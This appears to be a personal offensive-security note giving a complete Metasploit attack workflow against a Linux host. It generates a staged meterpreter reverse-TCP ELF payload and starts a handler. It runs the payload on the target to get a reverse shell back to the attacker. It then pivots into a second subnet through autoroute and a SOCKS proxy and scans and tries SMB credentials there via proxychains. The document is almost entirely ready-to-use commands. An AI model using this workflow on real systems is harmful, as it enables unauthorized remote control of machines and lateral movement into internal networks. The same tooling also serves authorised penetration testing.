# temp — Metasploit shell + pivot

Get a meterpreter session on the Linux box, then pivot through it into a second network. Use **meterpreter** (not a raw shell) — autoroute/SOCKS only work through meterpreter, and staged meterpreter also avoids the stageless-ELF segfault.

## 1. Build it (meterpreter, staged)

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<you> LPORT=443 -f elf -o shell.elf
```

## 2. Start the handler

```bash
msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST <you>; set LPORT 443; run"
```

## 3. Run it on the target

```bash
chmod +x shell.elf && ./shell.elf      # -> you get: meterpreter >
```

## 4. Pivot into the second network

Example: the box also touches `10.10.20.0/24`.

```bash
# in the meterpreter session:
run autoroute -s 10.10.20.0/24         # route that subnet through this session
bg                                      # background to the msf console

# open a SOCKS proxy so tools outside msf can reach it:
use auxiliary/server/socks_proxy
set VERSION 5
set SRVPORT 1080
run
```

## 5. Use it from outside msf

Add to `/etc/proxychains4.conf`:

```text
socks5 127.0.0.1 1080
```

Then:

```bash
proxychains nmap -sT -Pn -n 10.10.20.5
proxychains nxc smb 10.10.20.0/24 -u user -p pass
```

---

Full / multi-hop version: [Pivoting & Tunneling](Obsidian%20Vault/Offense/Networking/Pivoting%20%26%20Tunneling.md#metasploit-pivoting)
